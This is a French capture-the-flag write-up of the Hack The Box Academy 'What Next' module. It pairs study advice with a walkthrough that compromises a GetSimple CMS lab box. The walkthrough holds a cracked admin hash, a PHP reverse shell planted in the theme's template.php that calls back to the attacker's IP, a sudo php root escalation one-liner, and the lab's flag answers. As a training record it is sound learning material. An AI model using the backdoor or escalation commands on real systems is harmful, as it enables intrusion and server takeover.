---
title: "HackTheBox - What Next"
date: 2025-11-14 00:40:00 +0200
categories: [HackTheBox, Learning]
tags: [learning]
description: "Write-up du module What Next"
image:
  path: /assets/img/posts/getting-started.png
  alt: "What Next"
---

## Informations sur la room

Découvrez le cours HTB sur ce que nous allons faire en général sur notre Job Role Path ainsi que sur HTB labs

**Lien :** [Problem Solving](https://academy.hackthebox.com/beta/module/77/section/732)

## Objectifs d'apprentissage

Cette room couvre les compétences suivantes :

- Savoir comment s'y prendre pour bien continuer sur HTB

---

## Next Steps

Maintenant que nous avons terminé ce module, nous devrions être **prêts à aborder les prochaines étapes** de `Hack The Box` et à développer nos compétences en tests d'intrusion et notre portfolio en sécurité de l'information. Examinons quelques-unes des étapes suivantes.

### Boxes & Challenges

Après avoir réalisé une première tâche simple dans le cadre de ce module, nous devrions être prêts à définir des objectifs plus ambitieux.

#### Root a Retired Easy Box

**Choisissez une box retirée du catalogue**, classée Facile, et terminez-la en suivant les instructions fournies avec l'abonnement VIP nécessaire pour accéder aux box retirées.

> Essayez de regarder une vidéo explicative de la box, puis tentez de reproduire ce que vous avez appris **sans suivre la vidéo étape par étape**. Si vous rencontrez des difficultés, vous pouvez vous référer à nouveau à la vidéo explicative.
{: .prompt-warning}

#### Complete a Retired Medium Box

Une fois que vous aurez résolu **une ou plusieurs boîtes faciles**, essayez de passer au `niveau supérieur` en complétant une **boîte moyenne**, ce qui nécessitera probablement des connaissances supplémentaires qui ne sont généralement pas requises pour les boîtes faciles.

### Root Our First Live Box

Une fois que vous aurez terminé `5 à 10 boîtes de niveau Facile/Moyen` (retirées du jeu), vous devriez pouvoir terminer votre **première boîte Facile sans consulter de solution complète**. Essayez de choisir une boîte Facile dont le niveau de difficulté est compris entre 1 et 3 sur 10. Si vous rencontrez des difficultés, vous pourrez toujours demander de l'aide via les ressources mentionnées précédemment.

Votre première active box sera peut-être la plus difficile, car vous devrez vous **débrouiller seul** pour la première fois, **sans consulter de solution ni d'explication**. C'est un excellent signe que vous progressez. Une fois votre première boîte en direct terminée, essayez d'en terminer d'autres, ainsi que des boîtes en direct de niveau **Moyen/Difficile**.

---

### Keep Learning

Bien que la réalisation de tests d'intrusion et la **lecture des consignes** soient d'excellents moyens d'apprendre, ces tests et défis peuvent présenter de nombreuses difficultés. Par conséquent, si nous nous fions uniquement à ces tests et aux tutoriels pour apprendre, nous risquons de **négliger certains aspects essentiels** des tests d'intrusion. C'est pourquoi il est essentiel de **poursuivre notre apprentissage avec d'autres modules de l'Académie** dans les domaines où nous souhaitons progresser, jusqu'à ce que nous maîtrisions suffisamment chaque sujet.

De plus, chaque test se concentre sur un seul aspect de l'apprentissage. Il est donc nécessaire de compléter notre approche par un apprentissage guidé, c'est-à-dire par les modules de l'Académie, afin de devenir un testeur d'intrusion ou un professionnel de la sécurité de l'information plus complet.

> Essayez de dresser une liste des modules qui vous intéressent et ajoutez-les à votre **liste de tâches**. Dès que vous souhaitez progresser, consultez votre liste de tâches et terminez le module suivant.
{: .prompt-tip}

---

### Giving Back

#### Answer Questions

Il est probable que nous ayons consulté les **canaux d'assistance** pendant nos interventions sur des systèmes en direct. Une fois un système terminé, n'hésitez pas à revenir sur ces canaux et à aider les autres, comme on nous a aidés. `Nous avons tous commencé un jour`; **la solidarité est essentielle dans notre parcours en sécurité informatique**.

Comme évoqué précédemment, s'impliquer dans la communauté et aider les autres est un excellent moyen de contribuer et d'améliorer simultanément nos connaissances et notre profil.

#### Share a Retired Box Walkthrough

Lors de l'analyse d'une machine spécifique, il est essentiel de **documenter précisément chaque étape** et commande pour obtenir des informations d'accès complètes. Cette documentation est précieuse pour l'avenir, face à des vulnérabilités similaires, et constitue un excellent moyen d'apprendre à documenter et à rapporter nos découvertes, une compétence indispensable pour tout testeur d'intrusion. Nous vous recommandons de retrouver notre meilleure procédure d'analyse pour une machine obsolète, de l'enrichir pour en faire un compte rendu complet, puis de le publier **afin que d'autres puissent en profiter**.

> Il est préférable de publier un guide pour une boîte **récemment retirée** du service. Essayez donc de rédiger un guide pour une boîte active que vous avez terminée, et publiez-le une fois qu'elle sera retirée.
{: .prompt-tip}

---

### Way Forward

Une fois toutes les étapes précédentes terminées, il reste encore de nombreuses cases à cocher pour **continuer à apprendre**, et Hack The Box regorge d'opportunités d'apprentissage. Voici quelques idées :

- Root a Retired Easy Box
- Root a Retired Medium Box
- Root an Active Box
- Complete an Easy Challenge
- Share a Walkthrough of a Retired Box
- Complete Offensive Academy Modules
- Root Live Medium/Hard Boxes
- Complete A Track
- Win a Hack The Box Battlegrounds Battle
- Complete A Pro Lab

> Dès l'instant où nous cessons d'apprendre, nous cessons de progresser.
{: .prompt-info}

---

## Knowledge Check

Mettons en pratique tout ce que nous avons appris dans ce module et attaquons notre première boîte sans guide.

---

### Tips

N'oubliez pas que **l'énumération est un processus itératif**. Après avoir effectué nos analyses de ports Nmap, assurez-vous de réaliser **une énumération détaillée** de tous les ports ouverts en fonction des services qui y sont exécutés. Suivez la même procédure que pour Nibbles :

- `Énumération/Analyse` avec Nmap : effectuez une analyse rapide des ports ouverts, suivie d'une analyse complète.

- `Recherche d'empreintes web` : vérifiez la présence d'applications web en cours d'exécution sur les ports identifiés, ainsi que les fichiers et répertoires cachés. Whatweb et Gobuster sont des outils utiles pour cette étape.

- Si vous identifiez l'URL du site web, vous pouvez l'ajouter à votre fichier « `/etc/hosts` » avec l'adresse IP obtenue dans la question ci-dessous pour y accéder normalement, bien que cela ne soit pas indispensable.

- Après avoir identifié les technologies utilisées, utilisez un outil comme `Searchsploit` pour trouver des exploits publics ou recherchez sur Google des **techniques d'exploitation manuelle**.

- Après avoir obtenu un accès initial, utilisez la technique du `pseudo-terminal (pty) de Python 3` pour vous connecter à un terminal virtuel (TTY).

- Effectuez une `énumération manuelle et automatisée` du système de fichiers, en recherchant les erreurs de configuration, les services présentant des vulnérabilités connues et les données sensibles en clair, telles que les identifiants.

- Organisez ces données hors ligne afin de déterminer les `différentes manières` d'obtenir les privilèges root sur cette cible.

Il existe deux manières d'obtenir un accès au système : l'une via `Metasploit` et l'autre `manuellement`. Relevez le défi d'explorer et de **comprendre ces deux méthodes**.

Après avoir obtenu un accès au système cible, il existe deux manières d'élever ses privilèges jusqu'à l'accès root. Utilisez des scripts d'assistance tels que [LinEnum](https://github.com/rebootuser/LinEnum) et [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). Recherchez les deux techniques d'élévation de privilèges les plus connues.

Amusez-vous, continuez d'apprendre et n'oubliez pas de `sortir des sentiers battus `!

---

**Spawn the target, gain a foothold and submit the contents of the user.txt flag.**

Ok défi relevé, maintenant nous allons mettre en pratique tout ce que nous avons appris jusqu'à maintenant !

Déjà je `ping` la machine cible pour voir si tout va bien

```bash
┌─[eu-academy-3]─[10.10.14.146]─[htb-ac-1999270@htb-xnoovkibqw]─[~]
└──╼ [★]$ ping 10.129.120.125
PING 10.129.120.125 (10.129.120.125) 56(84) bytes of data.
64 bytes from 10.129.120.125: icmp_seq=1 ttl=63 time=48.8 ms
64 bytes from 10.129.120.125: icmp_seq=2 ttl=63 time=49.0 ms
^C
```

Maintenant nous savons que tout va bien nous pouvons effectuer la **première étape** qui consiste a faire **l'énumération des ports** sur la machine avec nmap

```bash
┌─[eu-academy-3]─[10.10.14.146]─[htb-ac-1999270@htb-xnoovkibqw]─[~]
└──╼ [★]$ nmap -sC -sV -p- 10.129.120.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-13 18:00 CST
Nmap scan report for 10.129.120.125
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.22 seconds
```

Comme nous pouvons le voir ici, nous qu'il y a un port SSH sur le port `22` et http sur `80` comme d'habitude et que le le port http utilise `Apache 2.4.41`

Maintenant nous allons faire une énumération avec `gobuster`

```bash
┌─[eu-academy-3]─[10.10.14.146]─[htb-ac-1999270@htb-xnoovkibqw]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.120.125 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.120.125
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 316] [--> http://10.129.120.125/admin/]
/backups              (Status: 301) [Size: 318] [--> http://10.129.120.125/backups/]
/data                 (Status: 301) [Size: 315] [--> http://10.129.120.125/data/]
/index.php            (Status: 200) [Size: 5485]
```

Alors j'ai réussi a trouvé ceci avant que gobuster ne puisse plus faire de requêtes je ne sais pas pourquoi mais du coup j'ai visité la page `/backups` mais il n'y a rien ou du moins pour l'instant mais par contre sur la page `/data` nous pouvons y retrouver un dossier `users` qui contenanit un fichier nommé `admin.XML` et voici son contenu:

```XML
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
```

Ce qui confirme déjà le nom d'utilisateur et le mot de passe semble encrypter nous allons essayer de le décrypter.

Je suis allé sur [ce site](hashes.com) et j'ai collé le le PWD

```bash
d033e22ae348aeb5660fc2140aec35850c4da997:admin
```

Donc le mot de passe est `admin` nous allons tester ceci en nous connectant sur `/admin`

En effet nous sommes maintenant connecté en tant qu'admin

En consultant le site d'un peu plus près je me rend compte que il utilise une version obselette de `GetSimple` comme dit dans l'onglet `Support` du panel admin ce qui m'a donné l'idée d'aller chercher sur `Metasploit`

```bash
[msf](Jobs:0 Agents:0) >> search getsimple

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/getsimplecms_unauth_code_exec
```

Parfait nous avons 2 exploits possible mais l'un semble pour se connecter au site si on est pas authentifié (le numéro 1) alors que l'autre semble être si on est connecté ce qui est notre cas donc nous allons utiliser le `numéro 0` avec `use 0`

```bash
[msf](Jobs:0 Agents:0) exploit(unix/webapp/get_simple_cms_upload_exec) >> show options

Module options (exploit/unix/webapp/get_simple_cms_upload_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   PASSWORD                    yes       The right password for the provided username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni,
                                          socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /GetSimpleCMS    yes       The full URI path to GetSimplecms
   USERNAME                    yes       The username that will be used for authentication process
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  94.237.50.117    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (PHP Payload)



View the full module info with the info, or info -d command.
```

Voici les options dont il a besoin pour fonctionner correctement, nous devons remplir les informations suivante:

- PASSWORD -> admin
- RHOSTS -> 10.129.120.125
- TARGETURI -> /
- USERNAME -> admin
- LHOST -> votre_ip

Il suffi de `run` ou `exploit` le tout et le tour est joué:

```bash
[msf](Jobs:0 Agents:0) exploit(unix/webapp/get_simple_cms_upload_exec) >> show options

Module options (exploit/unix/webapp/get_simple_cms_upload_exec):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   PASSWORD   admin                  yes       The right password for the provided username
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5,
                                               sapni, socks5h, http
   RHOSTS     10.129.120.125  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit
                                               .html
   RPORT      80                     yes       The target port (TCP)
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                      yes       The full URI path to GetSimplecms
   USERNAME   admin                  yes       The username that will be used for authentication process
   VHOST                             no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.146     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (PHP Payload)



View the full module info with the info, or info -d command.
```

```bash
[msf](Jobs:0 Agents:0) exploit(unix/webapp/get_simple_cms_upload_exec) >> run
[*] Started reverse TCP handler on 10.10.14.146:4444 
[*] 10.129.120.125:80 - Authenticating...
[+] 10.129.120.125:80 - The authentication process is done successfully!
[*] 10.129.120.125:80 - Extracting Cookies Information...
[*] 10.129.120.125:80 - Uploading payload...
[-] 10.129.120.125:80 - Exploit aborted due to failure: unknown: 10.129.120.125:80 - Upload failed
[*] Exploit completed, but no session was created.
```

Ok donc j'ai eu une erreur et je ne comprend pas encore pourquoi. Bon sinon on peut le faire manuellement en uploadant un fichier `PHP` dans l'éditeur de thème directement dans le site.

On y voit notre thème actuel et on nous dit qu'il est stocké dans `/theme/Innovation/`

Et on peut aussi l'éditer pour changer le code php voici ce que j'ai mis comme `reverse shell php` (j'édite le fichier `template.php`)

```bash
<?php if(!defined('IN_GS')){ die('you cannot load this page directly.'); }
/****************************************************
*
* @File: 			template.php
* @Package:		GetSimple
* @Action:		Innovation theme for GetSimple CMS
*
*****************************************************/
if(isset($_GET['shell'])){
    $ip = '10.10.14.146';
    $port = 4444;
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
    exit();
}

# Get this theme's settings based on what was entered within its plugin. 
# This function is in functions.php 
$innov_settings = Innovation_Settings();

# Include the header template
include('header.inc.php'); 
?>
	
	<div class="wrapper clearfix">
		<!-- page content -->
		<article>
			<section>
				
				<!-- title and content -->
				<h1><?php get_page_title(); ?></h1>
				<?php get_page_content(); ?>
				
				<!-- page footer -->
				<div class="footer">
					<p>Published on <time datetime="<?php get_page_date('Y-m-d'); ?>" pubdate><?php get_page_date('F jS, Y'); ?></time></p>
				</div>
			</section>
			
		</article>
		
		<!-- include the sidebar template -->
		<?php include('sidebar.inc.php'); ?>
	</div>

<!-- include the footer template -->
<?php include('footer.inc.php'); ?>
```

En effet j'ai remplacé tout le contenu du `template.php` par le reverse shell de `pentestmonkey`

J'ai mis un shell en écoute sur le port 4444 et j'ai sauvegardé le fichier puis je me suis rendu sur le fichier modifié pour l'exécuter

J'ai maintenant une connexion reverse shell sur la machine et j'ai trouvé le flag `user.txt`

```bash
www-data@gettingstarted:/home/mrb3n$ cat user.txt
cat user.txt
```

**Réponse :** `7002d65b149b0a4d19132a66feed21d8`

**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**

Maintenant nous devons obtenir le `root.txt` en montant en privilèges donc dans un premier temps nous allons d'abors faire la commande `sudo -l` pour voir ce que nous pouvons faire

```bash
www-data@gettingstarted:/home/mrb3n$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

Nous avons pas besoin de mot de passe sur `/usr/bin/php` donc j'ai cherché ce qu'on pouvait faire avec ça et sur [ce site](https://medium.com/@rebaleos0/privilege-escalation-all-all-nopasswd-usr-bin-php-241a2c43e58d) j'ai trouvé la commande suivante :

```bash
sudo php -r "system('/bin/bash');"
```

Ce qui m'a mis directement en `root` et j'ai juste eu a cat le fichier `root.txt` dans `/root/root.txt`

```bash
root@gettingstarted:~# cat root.txt
cat root.txt
```


**Réponse :** `f1fba6e9f71efb2630e6e34da6387842`

**Cours complété**

{% include comments.html %}